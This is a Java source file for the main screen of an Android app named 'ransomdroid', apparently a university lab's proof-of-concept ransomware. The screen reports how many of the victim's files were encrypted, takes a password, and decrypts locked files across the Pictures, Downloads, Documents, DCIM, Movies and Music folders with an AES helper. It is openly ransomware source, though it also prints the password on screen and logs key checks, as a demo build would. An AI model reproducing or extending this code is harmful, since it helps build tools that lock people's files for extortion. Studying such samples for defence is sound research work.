package br.unb.lasp.ransomdroid.activities;

import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;
import android.annotation.TargetApi;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AutoCompleteTextView;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.common.api.GoogleApiClient;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import br.unb.lasp.Global;
import br.unb.lasp.ransomdroid.R;
import br.unb.lasp.util.Storage;
import br.unb.lasp.util.SymmetricAES;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = new Object() {
    }.getClass().getName();

    private View mMainView;
    private View mProgressView;
    private TextView mDecryptMsgView;
    private AutoCompleteTextView mPassTextView;
    private Button mEvaluateButton;

    private String msg = "";
    private GoogleApiClient client;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        mMainView = findViewById(R.id.main_view);

        mProgressView = findViewById(R.id.main_progress);

        mPassTextView = (AutoCompleteTextView) findViewById(R.id.main_password);
        mPassTextView.setVisibility(View.INVISIBLE);
        mPassTextView.setEnabled(false);

        mEvaluateButton = (Button) findViewById(R.id.main_decrypt_button);
        mEvaluateButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {
                recover(mPassTextView.getText().toString());
            }
        });
        mEvaluateButton.setVisibility(View.INVISIBLE);
        mEvaluateButton.setEnabled(false);

        mDecryptMsgView = (TextView) findViewById(R.id.main_encrypt_msg);
        mDecryptMsgView.setVisibility(View.INVISIBLE);
        mDecryptMsgView.setEnabled(false);

        showProgress(true);
        new UpdateFieldsTask().execute();
    }

    @Override
    public void onStart() {
        super.onStart();
    }

    @Override
    public void onStop() {
        super.onStop();
    }

    private class UpdateFieldsTask extends AsyncTask<Void, Void, Boolean> {

        String mErrorMsg;

        UpdateFieldsTask() {
        }

        @Override
        protected void onPreExecute() {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            super.onPreExecute();
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());

            return true;
        }

        @Override
        protected void onPostExecute(final Boolean success) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            if (success) {
                mPassTextView.setEnabled(true);
                mPassTextView.setVisibility(View.VISIBLE);
                mEvaluateButton.setEnabled(true);
                mEvaluateButton.setVisibility(View.VISIBLE);
                mDecryptMsgView.setText(getString(R.string.prompt_encrypted_files) + Global.numFiles + " Pass=" + Global.pass);
                mDecryptMsgView.setEnabled(true);
                mDecryptMsgView.setVisibility(View.VISIBLE);
            } else {
                Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
            }
            showProgress(false);
        }

        @Override
        protected void onCancelled() { }

    }

    @TargetApi(Build.VERSION_CODES.HONEYCOMB_MR2)
    private void showProgress(final boolean show) {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR2) {
            int shortAnimTime = getResources().getInteger(android.R.integer.config_shortAnimTime);

            mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
            mMainView.animate().setDuration(shortAnimTime).alpha(
                    show ? 0 : 1).setListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
                }
            });

            mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
            mProgressView.animate().setDuration(shortAnimTime).alpha(
                    show ? 1 : 0).setListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
                }
            });
        } else {
            mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
            mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
        }
    }

    private void recover(String strKey){
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());

        if(!Storage.isExternalStorageWritable()){
            Toast.makeText(MainActivity.this, "FileSystem Error", Toast.LENGTH_SHORT).show();
            return;
        }

        // list tmp files
        List<File> dirList = new ArrayList<>();
        dirList.add(Storage.getPicturesDir());
        dirList.add(Storage.getDownloadsDir());
        dirList.add(Storage.getDocumentsDir());
        dirList.add(Storage.getDCIMSDir());
        dirList.add(Storage.getMoviesDir());
        dirList.add(Storage.getMusicsDir());
        List<File> fileList = new ArrayList<>();
        for (File dir : dirList) {
            if (dir != null) {
                fileList.addAll(Storage.listTmpFilesRecursively(dir, new ArrayList<File>()));
            }
        }

        for(File file: fileList){

            // get input
            byte[] input = null;
            try {
                FileInputStream fis = new FileInputStream(file);
                input = new byte[fis.available()];
                while (fis.read(input) != -1) {
                    // do nothing, just read
                }
                fis.close();
            } catch (FileNotFoundException e) {
                Log.e(TAG, e.getMessage(), e);
            } catch (IOException e) {
                Log.e(TAG, e.getMessage(), e);
            } catch (Exception e) {
                Log.e(TAG, e.getMessage(), e);
            }

            // parse
            byte[] key  = SymmetricAES.getSecretKeySpec(strKey).getEncoded();
            Log.i(TAG, "Key? " + Arrays.equals(key,Global.key.getEncoded()));
            input = SymmetricAES.decrypt(input, SymmetricAES.getSecretKeySpec(strKey));
            file.delete();

            // write
            FileOutputStream fos = null;
            try {
                fos = new FileOutputStream(file);
                fos.write(input);
                fos.flush();
                fos.close();
            } catch (Exception e) {
                Log.e(TAG, e.getMessage(), e);
            }finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        Log.e(TAG, e.getMessage(), e);
                    }
                }
            }

            try{

                String nFileStr = file.getPath().substring(0, (file.getPath().length() - 4 ));
                Log.i(TAG, file.getPath());
                Log.i(TAG, nFileStr);
                boolean isEqual = FileUtils.contentEquals(file, new File(nFileStr));
                Log.i(TAG, "IsEqual? " + isEqual);
            } catch (IOException e) {
                Log.e(TAG, e.getMessage(), e);
            } catch (Exception e) {
                Log.e(TAG, e.getMessage(), e);
            }
        }

        Toast.makeText(MainActivity.this, "Recovered Files: " + fileList().length, Toast.LENGTH_SHORT).show();
    }

}